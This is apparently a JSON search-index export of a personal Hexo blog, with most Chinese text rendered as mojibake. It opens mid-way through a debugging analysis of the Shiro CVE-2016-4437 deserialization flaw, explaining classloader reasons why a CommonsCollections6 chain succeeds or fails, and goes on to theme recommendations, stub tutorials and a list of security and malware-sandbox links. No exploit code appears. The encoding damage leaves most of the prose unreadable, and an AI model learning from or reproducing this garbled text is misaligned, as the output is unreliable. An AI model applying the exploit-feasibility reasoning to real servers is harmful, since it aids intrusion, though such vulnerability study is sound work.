found.\n\nç¿»è¯‘è¿‡æ¥å¤§ä½“æ„æ€å°±æ˜¯Transformerç±»æ‰¾ä¸åˆ°ï¼Œæˆ‘ä»¬è·Ÿä¸€ä¸‹ååºåˆ—åŒ–çš„å…¥å£ç‚¹çœ‹çœ‹\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æœ€åç”¨çš„æ˜¯ClassResolvingObjectInputStreamç±»è¿”å›è¾“å…¥æµï¼Œè€Œä¸æ˜¯å¸¸è§„çš„ObjectInputStreamç±»ï¼Œè·Ÿè¿›è¯¥ç±»\nåœ¨ClassResolvingObjectInputStreamç±»ä¸­ç»§æ‰¿äº†ObjectInputStreamç±»å¹¶ä¸”é‡å†™äº†resolveClass()æ–¹æ³•ï¼Œè·Ÿè¿›ClassUtils.forName()æ–¹æ³•åˆç»§ç»­è°ƒç”¨äº†loadClass()æ–¹æ³•ï¼Œå…¶ä¸­å‚æ•°å€¼ä¸º[Lorg.apache.commons.collections.Transformer;\nè¿™é‡Œçš„æ ¼å¼æ˜¯JNIå­—æ®µæè¿°ç¬¦ï¼Œ[è¡¨ç¤ºæ•°ç»„ï¼ŒLä»£è¡¨ç±»æè¿°ç¬¦ï¼Œ;è¡¨ç¤ºç±»ååˆ°è¿™é‡Œç»“æŸã€‚\næ¥ç€ç»§ç»­è·Ÿè¿›loadClass()æ–¹æ³•\nå¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨çš„ClassLoaderä¸ºParallerWebappClassLoaderï¼Œæ¥ç€åˆ°loadClass()æ–¹æ³•ï¼Œè¿™é‡Œæ¥ç€è·Ÿè¿›éœ€è¦æ·»åŠ  tomcat çš„æºç æ‰èƒ½ç»§ç»­è¿›è¡Œè°ƒè¯•ï¼ˆè¿™é‡Œæ˜¯å·æ‡’åšæ³•ï¼Œå¦‚æœæƒ³é£Ÿç”¨æ›´ä½³ï¼Œç§»æ­¥Tomcatæºç è°ƒè¯•ï¼‰\nå¯¼å…¥ tomcat çš„ jar åŒ…ä¹‹åç»§ç»­è·Ÿè¿›loadClass()æ–¹æ³•è¿›å…¥åˆ°äº†WebappClassLoaderBase#loadClass()\nç©ä¸‹èµ°åˆ°findLoadedClass0()æ–¹æ³•\nfindLoadedClass0()æ–¹æ³•å»ç¼“å­˜ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ï¼Œä»è·Ÿçš„ç»“æœä¸Šå¾—åˆ°æ˜¯ä¸å­˜åœ¨ï¼Œç»§ç»­å¾€ä¸‹èµ°åˆ° this.findLoadedClass()æ–¹æ³•\nä¾ç„¶ä¸ºnullï¼Œåé¢çš„è·Ÿç€å‡ ä¸ªæ–¹æ³•éƒ½æ˜¯ä¸º nullï¼Œæˆ‘ä»¬ç•¥å»ï¼Œåˆ°æœ€åä¸€æ­¥å…³é”®å¤„ï¼Œä¹Ÿå°±æ˜¯åˆ°äº†Class.forName()æ–¹æ³•\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶çš„çˆ¶åŠ è½½å™¨ä¸ºURLClassLoader\nå…¶ä¸­ucpæ˜¯URLClassLoaderç±»çš„å­—æ®µï¼Œucpçš„æˆå‘˜pathæ˜¯ä¸€ä¸ª ArrayList å¯¹è±¡ï¼Œå­˜å‚¨ç€ç±»çš„æœç´¢è·¯å¾„ã€‚è€Œè¿™é‡Œè¿™äº›è·¯å¾„å…¨éƒ½æ˜¯ tomcat ä¸‹çš„ lib ç›®å½•æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰commons-collectionsçš„ä¾èµ–æ–‡ä»¶ã€‚\nä¸‹é¢è´´ä¸Šåœ¨Class.forName()æ–¹æ³•åçš„ debug è¿‡ç¨‹è§†é¢‘ï¼ˆå› ä¸ºå†™æˆæ–‡å­—æè¿°è¿‡äºç¹çå°±è´´ä¸Šè§†é¢‘ï¼‰\n\n\n\n\n\n\n\n\n\nè§†é¢‘æŒ‚äº†ï¼Œæœ‰éœ€è¦çš„å³ä¸‹è§’å‘é‚®ä»¶ç»™æˆ‘ã€‹\nåœ¨ debug è§†é¢‘ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¼ è¿›Class.forName()æ–¹æ³•çš„å‚æ•° name ä¸º[Lorg.apache.commons.collections.Transformer;ï¼Œæ¥ç€åé¢èµ°åˆ°findLoadedClass()æ–¹æ³•æ—¶è¿˜åŸæˆäº†æ­£å¸¸çš„org.apache.commons.collections.Transformerï¼Œå› æ­¤æœ‰äº›æ–‡ç« åœ¨è·Ÿåˆ°å‰é¢æ—¶å°±æ–­å®šæ˜¯å…ˆå‰çš„[Lorgxxxæ ¼å¼å¯¼è‡´æ— æ³•æ‰¾åˆ°çš„ç»“è®ºå¹¶ä¸å‡†ç¡®ï¼Œè¿™å¹¶ä¸æ˜¯æœ€ç»ˆè¿‡ç¨‹ã€‚\næ­¤å¤–ï¼Œå¯ä»¥çœ‹åˆ°ClassLoaderçš„åŠ è½½è¿‡ç¨‹ä¸ºAppClassLoader â€“&gt; ExtClassLoader â€“&gt; BootstrapClassLoaÂ·derï¼Œå‡æœç´¢ä¸åˆ°org.apache.commons.collections.Transformerã€‚\næœç´¢ä¸åˆ°åæŠ›å‡ºClassNotFoundExceptionçš„å¼‚å¸¸\n\n\nå› æ­¤å’Œä¹‹å‰çš„æŠ¥é”™å¯¹åº”ä¸Šäº†ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆ spring æ„å»ºçš„ shiro æ²¡æœ‰æŠ¥é”™æ­£å¸¸å¼¹å‡ºè®¡ç®—å™¨äº†å‘¢ï¼Ÿ\næˆ‘ä»¬ç»§ç»­è°ƒè¯•ä¸€ä¸‹\nåœ¨è¯¥ç¯å¢ƒä¸­ï¼ŒåŠ è½½çš„ClassLoaderä¸ºTomcatEmbeddedWebappClassLoaderï¼Œè€Œä¸æ˜¯ä¹‹å‰ shiro åŸç”Ÿç¯å¢ƒçš„ParallerWebappClassLoaderã€‚\nç»§ç»­è·Ÿè¿›loadClass()æ–¹æ³•ï¼Œè·³åˆ°äº†TomcatEmbeddedWebappClassLoader#loadClass()æ–¹æ³•\nç»§ç»­å¾€ä¸‹èµ°ï¼Œç›´åˆ°Class.forName()æ–¹æ³•\nå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„çˆ¶åŠ è½½å™¨ä¸ºAppClassLoaderç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œå†çœ‹çœ‹æ­¤æ—¶çš„ path\næ­¤æ—¶çš„ path ä¸å†æ˜¯ tomcat ä¸‹çš„ï¼Œè€Œæ˜¯ java ç¯å¢ƒä¸­çš„ï¼ŒåŒ…å«äº†commons-collectionsä¾èµ–ï¼Œå› æ­¤å¯ä»¥æˆåŠŸåŠ è½½åˆ°\nè¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆåœ¨ spring æ„å»ºçš„ Shiro ç¯å¢ƒä¸­Commons-Collections6å¯ä»¥æ‰“æˆåŠŸï¼Œè€ŒåŸç”Ÿçš„ Shiro ç¯å¢ƒå´æŠ¥é”™å¤±è´¥çš„æƒ…å†µã€‚\nè‡³äºä¸ºä»€ä¹ˆ path ä¼šä¸ä¸€æ ·ï¼Œçˆ¶ç±»åŠ è½½å™¨ä¹Ÿä¸ä¸€æ ·ï¼Œå°è¯•è·Ÿäº†ä¸€ä¸‹ï¼Œå®åœ¨è¿‡äºå¤æ‚ï¼Œé‚æš‚æ—¶æ”¾å¼ƒï¼Œè°ƒè¯•åˆ°æ­¤ã€‚\nç­‰å“ªä¸€å¤©çŸ¥è¯†å‚¨å¤‡è¶³å¤Ÿäº†ï¼Œå†æ¥è§£æƒ‘ã€‚\næ¼æ´ä¿®å¤åœ¨ Shiro 1.2.5 ç‰ˆæœ¬çš„æ›´æ–°ä¸­ï¼Œç”¨æˆ·éœ€è¦æ‰‹åŠ¨é…ç½® CipherKeyï¼Œå¦‚æœä¸è®¾ç½®ï¼Œå°†ä¼šåŠ¨æ€ç”Ÿæˆä¸€ä¸ª CipherKeyã€‚ä½†ååºåˆ—åŒ–æµç¨‹æ²¡æœ‰ä¿®æ”¹ï¼Œè¿™ä¹Ÿæ˜¯ Shiro è‡³ä»Šä¾ç„¶åœ¨å„å¤§ HW æ¼”ç»ƒä¸­é¢‘ç¹å‡ºç°çš„åŸå› ã€‚\n\n\n\n\n\n\n\n\n\nåŸåˆ›ä½œè€…åœ°å€ï¼šhttps://github.com/dota-st/vulnEnv\n","slug":"CVE-2016-4437","date":"2021-11-09T16:18:15.000Z","categories_index":"Javaå®‰å…¨","tags_index":"Javaå®‰å…¨","author_index":"Akpigs"},{"id":"66b65759df9f8ae35f6c9a2b2a4db094","title":"ä¸»é¢˜æ¨è","content":"ä¸é”™çš„Hexoä¸»é¢˜æ¨èvuepress-auroraï¼švuepress-theme-aurora æ˜¯ä¸€æ¬¾åŸºäº Vuepress2 çš„åšå®¢ä¸»é¢˜ï¼Œå°†æœ¬åœ° Markdown æ–‡ä»¶è§£ææˆé™æ€ html é¡µé¢ï¼Œä½œä¸ºåšå®¢æ–‡ç« ã€‚æ­é… è¯´è¯´ï¼Œæ—¶é—´è½´ï¼Œæ–‡ç« åˆ†ç±»ï¼Œè¯„è®ºï¼Œå‹æƒ…é“¾æ¥ï¼Œç›¸å†Œï¼ŒéŸ³ä¹æ’­æ”¾å™¨ ç­‰ç‰¹è‰²åŠŸèƒ½ï¼Œç»™æ‚¨ä¸ä¸€æ ·çš„ä½¿ç”¨ä½“éªŒã€‚\nğŸ†100%è‡ªå®šä¹‰\nğŸŒˆç®€æ´ï¼Œæ¼‚äº®\nğŸ¨é«˜æ‰©å±•\nğŸ’«å¤šåŠŸèƒ½\nğŸ“–é…ç½®æ–‡æ¡£\n\nhttps://github.com/vuepress-aurora/vuepress-theme-aurora\nåœ¨çº¿æ¼”ç¤ºï¼šhttps://aurora.xcye.xyz/\n\nVdoingvuepress-theme-vdoing æ˜¯ä¸€æ¬¾ç®€æ´é«˜æ•ˆçš„ VuePress çŸ¥è¯†ç®¡ç†&amp;åšå®¢ä¸»é¢˜ã€‚å®ƒä»¥ Markdown ä¸ºä¸­å¿ƒçš„é¡¹ç›®ç»“æ„ï¼Œå†…ç½®è‡ªåŠ¨åŒ–å·¥å…·ï¼Œä»¥æ›´å°‘çš„é…ç½®å®Œæˆæ›´å¤šçš„äº‹ã€‚é…åˆå¤šç»´ç´¢å¼•å¿«é€Ÿå®šä½æ¯ä¸ªçŸ¥è¯†ç‚¹ï¼Œå¯ä»¥ä½œä¸ºçŸ¥è¯†åº“ä¹Ÿå¯ä»¥ä½œä¸ºåšå®¢ç³»ç»Ÿï¼›å…¶åŒ…å«ä¸‰ç§å…¸å‹çš„çŸ¥è¯†ç®¡ç†å½¢æ€ï¼šç»“æ„åŒ–ã€ç¢ç‰‡åŒ–ã€ä½“ç³»åŒ–ã€‚è½»æ¾æ‰“é€ å±äºä½ è‡ªå·±çš„çŸ¥è¯†ç®¡ç†å¹³å°ï¼›ä¸“ä¸ºé˜…è¯»è®¾è®¡çš„UIï¼Œé…åˆå¤šç§é¢œè‰²æ¨¡å¼ã€å¯å…³é—­çš„ä¾§è¾¹æ å’Œå¯¼èˆªæ ï¼Œå¸¦ç»™ä½ ä¸€ç§æ²‰æµ¸å¼é˜…è¯»ä½“éªŒã€‚\nğŸš€çŸ¥è¯†ç®¡ç†\nğŸŒˆç®€æ´é«˜æ•ˆ\nğŸ“–æ²‰æµ¸å¼é˜…è¯»\n\nGithubåœ°å€ï¼šhttps://github.com/xugaoyi/vuepress-theme-vdoing\nGiteeé•œåƒï¼šhttps://gitee.com/xugaoyi/vuepress-theme-vdoing\næ–‡æ¡£åœ°å€ï¼šhttps://doc.xugaoyi.com/\nçŸ¥è¯†åº“å…¼åšå®¢ç«™ï¼šhttps://xugaoyi.com/\nä»…åšå®¢ç«™ï¼šhttps://xugaoyi.github.io/vdoing-demo-blog/\nä»…çŸ¥è¯†åº“ï¼šhttps://xugaoyi.github.io/vdoing-demo-repository/\n\nHopevuepress-theme-hope ä¸€ä¸ªå…·æœ‰å¼ºå¤§åŠŸèƒ½çš„ vuepress ä¸»é¢˜âœ¨ã€‚V2 åŸºäº VuePress2ï¼Œå¸¦æœ‰ Vite2 &#x2F; Webpack5å’Œ Vue3 çš„å¼ºå¤§åŠŸèƒ½ã€‚\næ›´ä¸°å¯Œçš„å†…å®¹\nMarkdown å¢å¼º\né¡µé¢ UI\nå®Œæ•´çš„åšå®¢æ”¯æŒ\næœç´¢åŠŸèƒ½\næœç´¢å¼•æ“å¢å¼º\n\nGithubåœ°å€ï¼šhttps://github.com/vuepress-theme-hope/vuepress-theme-hope\nForkåœ°å€ï¼šhttps://stackblitz.com/fork/vuepress-theme-hope\næ–‡æ¡£åœ°å€ï¼šhttps://vuepress-theme-hope.github.io/v2/zh/\nåœ¨çº¿æ¡ˆä¾‹ï¼šhttps://mister-hope.github.io/\n\nButterflyï¼ˆè¶…çº§æ¨èï¼‰hexo-theme-butterfly ä¸€ä¸ªä¸º Hexo æ‰“é€ çš„ç®€æ´ã€æ¼‚äº®ã€å¿«é€Ÿçš„ä¸»é¢˜ã€‚\n\n\n\n\n\n\n\n\n\nç›¸å…³æ•™ç¨‹ç‰¹å¤šç‰¹è¯¦ç»†ï¼Œè‡ªå®šä¹‰åŒ–å¼ºï¼Œä½†æ˜¯éœ€è¦ä¼šä¸€äº›å‰ç«¯åŸºç¡€\nä¹‹å‰æ­å»ºè¿‡ï¼Œç”¨ä¹…åè§‰å¾—æŒºèŠ±é‡Œèƒ¡å“¨çš„ï¼Œè¿˜æ˜¯ç®€çº¦çœ‹ç€èˆ’æœğŸ¤“ğŸ˜…\nç®€å•æ¼‚äº®ï¼Œæ–‡ç« å†…å®¹ç¾è§‚æ˜“è¯»ï¼Œ\nMaterial Design è®¾è®¡\nå“åº”å¼è®¾è®¡ï¼Œåšå®¢åœ¨æ¡Œé¢ç«¯ã€å¹³æ¿ã€æ‰‹æœºç­‰è®¾å¤‡ä¸Šå‡èƒ½å¾ˆå¥½çš„å±•ç°\nç€‘å¸ƒæµå¼çš„åšå®¢æ–‡ç« åˆ—è¡¨ï¼ˆæ–‡ç« æ— ç‰¹è‰²å›¾ç‰‡æ—¶ä¼šæœ‰ 24 å¼ æ¼‚äº®çš„å›¾ç‰‡ä»£æ›¿ï¼‰\næ—¶é—´è½´å¼çš„å½’æ¡£é¡µ\nä¸°å¯Œçš„å…³äºæˆ‘é¡µé¢ï¼ˆåŒ…æ‹¬å…³äºæˆ‘ã€æ–‡ç« ç»Ÿè®¡å›¾ã€æˆ‘çš„é¡¹ç›®ã€æˆ‘çš„æŠ€èƒ½ã€ç›¸å†Œç­‰ï¼‰\nå¯è‡ªå®šä¹‰çš„æ•°æ®çš„å‹æƒ…é“¾æ¥é¡µé¢\næ”¯æŒæ–‡ç« ç½®é¡¶å’Œæ–‡ç« æ‰“èµ\næ”¯æŒ MathJax\nå¯è®¾ç½®å¤åˆ¶æ–‡ç« å†…å®¹æ—¶è¿½åŠ ç‰ˆæƒä¿¡æ¯\nGitalkã€Gitmentã€Valine å’Œ Disqus è¯„è®ºæ¨¡å—\né›†æˆäº†ä¸è’œå­ç»Ÿè®¡ã€è°·æ­Œåˆ†æï¼ˆGoogle Analyticsï¼‰å’Œæ–‡ç« å­—æ•°ç»Ÿè®¡ç­‰åŠŸèƒ½\næ”¯æŒåœ¨é¦–é¡µçš„éŸ³ä¹æ’­æ”¾å’Œè§†é¢‘æ’­æ”¾åŠŸèƒ½\n\nGithubåœ°å€ï¼šhttps://github.com/jerryc127/hexo-theme-butterfly\næ–‡æ¡£åœ°å€ï¼šhttps://butterfly.js.org/posts/21cfbf15/\né¢„è§ˆåœ°å€ï¼šhttps://tzy1997.com/\né­”æ”¹èµ„æºï¼š\nhttps://butterfly.zhheo.com/\nhttps://akilar.top/tags/\nhttps://anzhiy.cn/tags/\nhttps://blog.zhheo.com/tags/Hexo/\nhttps://www.chuckle.top/tags/Butterfly/\nhttps://blog.leonus.cn/categories/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/\nhttps://tzy1997.com/tags/Hexo/\nhttps://blog.imzjw.cn/tags/Butterfly/\nhttps://blog.eurkon.com/tags/Butterfly/\nhttps://hassanwong.top/tags/%F0%9F%A6%8BButterfly/\nhttps://zhu-dongya.gitee.io/archives/\n\n\n\nHexo Auroraï¼ˆæœ¬ç«™æ‰€ç”¨ï¼‰hexo-theme-aurora æ˜¯ä½¿ç”¨æå…‰é¢œè‰²å’Œ UI å…ƒç´ çš„ä¸‹ä¸€ä»£ä¸»é¢˜ã€‚å®ƒç»™ä½ å¹³æ»‘æµç•…çš„è‰²å½©å’Œæœªæ¥æ„Ÿã€‚åŸºäº Vue3 æ„å»ºï¼Œäº«å—ç”± Vue3 å»ºç«‹çš„å•é¡µé¢åº”ç”¨ï¼ˆSPAï¼‰æ‰€å¸¦æ¥çš„æ›´ä¼˜é›…ï¼Œæ›´å‹å¥½çš„ç”¨æˆ·ä½“éªŒã€‚\nNEW NPM&#x2F;Yarn å¿«é€Ÿå®‰è£… - å¯ä»¥è½»æ˜“çš„ä½¿ç”¨ NPM æˆ–è€… Yarn å®‰è£…ä¸»é¢˜ã€‚\næ¨èåŒºåŸŸ - å¯ä»¥åœ¨æ–‡ç« çš„ meta ä¸­æ·»åŠ  feature å±æ€§ï¼Œè®©å¤´ 3 ç¯‡æ–‡ç« æŒ‡å®šåˆ°é¦–é¡µæ¨èä½ç½®ã€‚\nå®æ—¶å¤šè¯­è¨€æ”¯æŒ - å¯ä»¥å®æ—¶åˆ‡æ¢åšå®¢å†…ä¸»è¦æ–‡å­—çš„è¯­è¨€ã€‚\næ•°æ®ç»Ÿè®¡ - ç»Ÿè®¡æ–‡å­—æ•°ã€æ–‡ç« æ•°ã€åˆ†ç±»æ•°å’Œæ ‡ç­¾æ•°ã€‚\næ–‡ç« é˜…è¯»æ—¶é•¿ - æ¯ä¸ªæ–‡ç« éƒ½ä¼šæ˜¾ç¤ºæ–‡ç« çš„é¢„ä¼°é˜…è¯»æ—¶é•¿ã€‚\nMathjax æ”¯æŒ - æ”¯æŒåœ¨ markdown ä¸­å†™ Maxjax è¯­æ³•çš„æ•°å­¦å…¬å¼ã€‚\nå•é¡µé¢åº”ç”¨ - é¡µé¢ä¸é¡µé¢ä¹‹é—´çš„è·³è½¬æ²¡æœ‰å»¶è¿Ÿæˆ–è€…ç­‰å¾…ï¼Œæ•°æ®éƒ½æ˜¯åŠ¨æ€åŠ è½½çš„ã€‚\nè¯„è®ºæ’ä»¶ - æ”¯æŒä½¿ç”¨ Gitalk æˆ–è€… Valine è¯„è®ºæ’ä»¶\næ–‡ç« æœç´¢ - å¯ä»¥æœç´¢å…¨ç«™çš„æ‰€æœ‰æ–‡ç« \næ–‡ç« å¯¼èˆª - å¯ä»¥åœ¨æ–‡ç« è¯¦æƒ…åº•éƒ¨è·³è½¬åˆ°ä¸Šä¸€ç¯‡æˆ–è€…ä¸‹ä¸€ç¯‡æ–‡ç« ã€‚\næœ€æ–°è¯„è®º - ç»™é¦–é¡µæ·»åŠ ä¸€ä¸ªæœ€æ–°è¯„è®ºæ¨¡å—ï¼Œæ”¯æŒä½¿ç”¨ gitalk æˆ–è€… valineã€‚\n\nGithubåœ°å€ï¼šhttps://github.com/auroral-ui/hexo-theme-aurora\næ–‡æ¡£åœ°å€ï¼šhttps://aurora.tridiamond.tech/zh/\né¢„è§ˆåœ°å€ï¼šhttps://tridiamond.tech/\n\nVolantisVolantis æ˜¯ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œã€é«˜åº¦æ¨¡å—åŒ–çš„ Hexo åšå®¢ä¸»é¢˜ã€‚å¾—ç›Šäºå…¶å¼ºå¤§çš„æ¨¡å—åŒ–ç‰¹æ€§ï¼Œæ‚¨å¯ä»¥è½»æ¾æ­å»ºä¸€ä¸ªæç®€é£æ ¼çš„åšå®¢ï¼Œä¹Ÿå¯ä»¥ä»¿ç…§å®˜ç½‘æ­å»ºä¸€ä¸ªå¤šäººåä½œçš„ã€åŒ…å«æ–‡æ¡£æ¨¡å—çš„å¤§ä½“é‡ç»¼åˆå‹åšå®¢ã€‚\n\nGithubåœ°å€ï¼šhttps://github.com/volantis-x/hexo-theme-volantis\næ–‡æ¡£åœ°å€ï¼šhttps://volantis.js.org/v6/getting-started/\né¢„è§ˆåœ°å€ï¼šhttps://volantis.js.org/\n\nFlyhexo-blog-fly åŸºäº Hexo æ¡†æ¶æ­å»ºï¼Œç”¨åˆ° hexo-theme-matery ä¸»é¢˜,å¹¶åœ¨æ­¤åŸºç¡€ä¹‹ä¸Šåšäº†å¾ˆå¤šä¿®æ”¹ï¼Œä¿®å¤äº†ä¸€äº› bugï¼Œå¢åŠ äº†ä¸€äº›æ–°çš„ç‰¹æ€§å’ŒåŠŸèƒ½ï¼Œå…¶åœ¨åŸä¸»é¢˜çš„åŸºç¡€ä¸Šæ–°å¢äº†è®¸å¤šå®ç”¨çš„åŠŸèƒ½ã€‚\n\nGithubåœ°å€ï¼šhttps://github.com/shw2018/hexo-blog-fly\næ–‡æ¡£åœ°å€ï¼šhttps://sunhwee.com/posts/6e8839eb.html\né¢„è§ˆåœ°å€ï¼šhttps://sunhwee.com/\n\nNexmoehexo-theme-nexmoe åŸºäº Hexo å¼€å‘ï¼Œå…¶æ”¯æŒå›¾ç‰‡ç€‘å¸ƒæµã€è‡ªå®šä¹‰ä¸»é¢˜é¢œè‰²ã€å†…ç½®&#x2F;å¤–ç½®æœç´¢ã€ä¾§æ å¤‡æ¡ˆä¿¡æ¯ã€ç½‘é¡µè®¿é—®ç»Ÿè®¡ã€æ”¯æŒå¤šæ¬¾è¯„è®ºæ’ä»¶ã€å†…ç½®å¤šè¯­è¨€ã€å›¾ç‰‡æ‡’åŠ è½½ã€ç¤¾äº¤æŒ‰é’®ç­‰åŠŸèƒ½ã€‚\nå›¾ç‰‡ç€‘å¸ƒæµ\nå›¾ç‰‡ç€‘å¸ƒæµ Pro\nç¯ç®±å¤§å›¾\nè‡ªå®šä¹‰ä¸»é¢˜é¢œè‰²\né—ªäº®çš„å½’æ¡£é¡µé¢\næ¼‚äº®çš„å‹æƒ…é“¾æ¥é¡µé¢\nå†…ç½®&#x2F;å¤–ç½®æœç´¢\nä¾§æ å¤‡æ¡ˆä¿¡æ¯\nç½‘é¡µè®¿é—®ç»Ÿè®¡\næ”¯æŒå¤šæ¬¾è¯„è®ºæ’ä»¶\nå†…ç½®å¤šè¯­è¨€\nå›¾ç‰‡æ‡’åŠ è½½\nç¤¾äº¤æŒ‰é’®\n\nGithubåœ°å€ï¼šhttps://github.com/theme-nexmoe/hexo-theme-nexmoe\næ–‡æ¡£åœ°å€ï¼šhttps://docs.nexmoe.com/\né¢„è§ˆåœ°å€ï¼šhttps://nexmoe.com/\n\nShoka\nGitHubåœ°å€ï¼šhttps://github.com/amehime/hexo-theme-shoka\n\næ–‡æ¡£åœ°å€ï¼šhttps://shoka.lostyu.me/computer-science/note/theme-shoka-doc/\n\né¢„è§ˆåœ°å€ï¼šhttps://shoka.lostyu.me/\n\n\nbambooç›´æ¥ç”¨\n\nGitHubåœ°å€ï¼šhttps://github.com/yuang01/hexo-theme-bamboo\næ–‡æ¡£åœ°å€ï¼šhttps://yuang01.github.io/post/hexo-theme-bamboo-new/\né¢„è§ˆåœ°å€ï¼š\né…ç½®ä¸€ï¼šhttps://yuang01.github.io/post/hexo-theme-bamboo-new/\né…ç½®äºŒï¼šhttps://yuang01.github.io/post/hexo-theme-bamboo-new/\né…ç½®ä¸‰ï¼šhttps://yuang01.github.io/post/hexo-theme-bamboo/theme/\né…ç½®å››ï¼šhttps://yuang01.github.io/post/hexo-theme-bamboo/front-matter/\né…ç½®äº”ï¼šhttps://yuang01.github.io/post/hexo-theme-bamboo/front-matter/\né…ç½®å…­ï¼šhttps://yuang01.github.io/post/hexo-theme-bamboo/suggest/\né…ç½®ä¸ƒï¼šhttps://yuang01.github.io/post/hexo-theme-bamboo/sidebar/#%E9%BB%98%E8%AE%A4%E7%9A%84%E4%BE%A7%E8%BE%B9%E6%A0%8F\n\n\n\n","slug":"Hexoä¸»é¢˜æ¨è","date":"2021-06-22T14:28:13.000Z","categories_index":"","tags_index":"èµ„æºæ¨è","author_index":"Akpigs"},{"id":"f5866dfa5c622e30663074315795c4d8","title":"JavaSE tutorial","content":"","slug":"JavaSE-tutorial","date":"2021-06-02T08:42:47.000Z","categories_index":"JavaBasic","tags_index":"Java,JavaSE","author_index":"Akpigs"},{"id":"c59d1c706dbef939f46c10d621fda176","title":"Javaweb tutorial","content":"\nclick here see more\n\n\n\n\n\n\n\n\n\nhttps://www.yuque.com/qingkongxiaguang/javaweb/hkgbvo#f58b5357\n\n\n","slug":"Javaweb-tutorial","date":"2021-05-02T08:43:40.000Z","categories_index":"Javaåç«¯","tags_index":"Java,JavaWeb","author_index":"Akpigs"},{"id":"382400db20d50f8c4a3ead6fea1a314f","title":"Welcome come to  Akpig's Blog","content":"\n\n\n\n\n\n\n\n\nIf you are reading this article, hexo has been successfully built, please take it a step further\nWelcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nHomeã€Aboutã€Archivesã€Tagsã€Linksã€MessageÂ Boardã€Moreã€\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n\n","slug":"hello-world","date":"2021-02-23T08:50:14.000Z","categories_index":"TestBlog","tags_index":"First Page","author_index":"Akpigs"},{"id":"db8ececde0a48c813879a1c92a0b7bcc","title":"ç®€æ˜“å¯¼èˆª","content":"\n\n\n\n\n\n\n\n\nä¸‹è¿°çš„å†…å®¹å‡æ”¶é›†äºäº’è”ç½‘ï¼Œæ—…è¡Œè€…ï¼Œæœ¬ç ´ç«™ç‚¹æ—¨åœ¨åŸåˆ›æ–‡ç« è®°å½•å­¦ä¹ ç»å†&amp;&amp;æ”¶é›†ä¼˜ç§€èµ„æºå‡å°‘å­¦ä¹ æˆæœ¬ï¼Œå¦‚æœæ‚¨åˆæ›´å¥½çš„æƒ³æ³•è¯·è”ç³»æˆ‘ã€‚è®©æˆ‘ä»¬ä¸€èµ·ä¼ æ‰¿å¼€æºç²¾ç¥ğŸ¤“â€¦â€¦\nå€¼å¾—æ¨èçš„ç½‘ç«™â€”â€”ä¿¡æ¯å®‰å…¨ä¿¡æ¯å®‰å…¨åœ¨çº¿æ–‡ä»¶æ£€æŸ¥åˆ†æ\nå¾®æ­¥åœ¨çº¿äº‘æ²™ç®±\nç—…æ¯’æ€»æ•°                    \nè…¾è®¯å“ˆå‹ƒåˆ†æç³»ç»Ÿ                    \nVirSCAN.org - å…è´¹çš„å¤šå¼•æ“åœ¨çº¿ç—…æ¯’æ‰«æç¨‹åºv1.02ï¼Œæ”¯æŒ47ä¸ªé˜²ç—…æ¯’å¼•æ“ï¼                    \næœªçŸ¥å¨èƒæ–‡ä»¶æ£€æµ‹ç³»ç»Ÿ-å®‰èŠ¯ç½‘ç›¾-å…è´¹çš„åœ¨çº¿ç—…æ¯’æ£€æµ‹åˆ†æå¹³å°ï¼Œè¿ç»­åå¹´ä¸ºGoogle VirusTotalæä¾›æœåŠ¡                    \n360å®‰å…¨å¤§è„‘æ²™ç®±äº‘                    \nMetaDefender Cloud | Advanced threat prevention and detection                    \nå…³äºJottiçš„æ¶æ„è½¯ä»¶æ‰«æç³»ç»Ÿ                    \nå¡å·´æ–¯åŸºå¨èƒæƒ…æŠ¥é—¨æˆ· â€” åˆ†æ                    \næ¶æ„è½¯ä»¶åˆ†æ &amp; URLé“¾æ¥æ‰«æ å…è´¹åœ¨çº¿ç—…æ¯’åˆ†æå¹³å° | é­”ç›¾å®‰å…¨åˆ†æ                    \nFree Automated Malware Analysis Service - powered by Falcon Sandbox                    \nIntezer Analyze â€“ Security analystsâ€™ trusted advisor                    \nå¥‡å®‰ä¿¡æƒ…æŠ¥æ²™ç®±                    \nå¤§åœ£äº‘æ²™ç®±æ£€æµ‹ç³»ç»Ÿ                    \nå®‰æ’åœ¨çº¿äº‘æ²™ç›’\n\nH4ck Site Nav\nHackè¡—-é»‘å®¢è¡—-é»‘å®¢æŠ€æœ¯å…¥é—¨-é»‘å®¢é›¶åŸºç¡€å…¥é—¨å¯¼èˆª-ç½‘ç»œå®‰å…¨çˆ±å¥½è€…çš„å®‰å…¨å¯¼èˆª | é»‘å®¢                        \n\næ¸—é€å¸ˆ ç½‘ç»œå®‰å…¨ä»ä¸šè€…å®‰å…¨å¯¼èˆª                        \n\nCTFå¯¼èˆª | åˆ†äº«CTFã€IOTã€ICSã€Carç›¸å…³å†…å®¹                        \n\nå®‰å…¨åœˆinfo - åšæ¥åœ°æ°”çš„ä¿¡æ¯å®‰å…¨å¯¼èˆª                        \n\nã€æç‰›å¯¼èˆªã€‘ç½‘ç»œå®‰å…¨èµ„æºå¯¼èˆªç«™                        \n\nå®‰å…¨å¯¼èˆª | å¾¡ç½‘å°šä¹¦çš„æ—¥è®°æœ¬\n\n\næŠ€èƒ½è·¯çº¿\nçŸ¥é“åˆ›å®‡ç ”å‘æŠ€èƒ½è¡¨v3.1 2016&#x2F;5&#x2F;18 å‘å¸ƒ by @çŸ¥é“åˆ›å®‡(www.knownsec.com) @ä½™å¼¦ & 404å›¢é˜Ÿ åç»­åŠ¨æ€è¯·å…³æ³¨å¾®ä¿¡å…¬ä¼—å·ï¼šLazy-Thought                        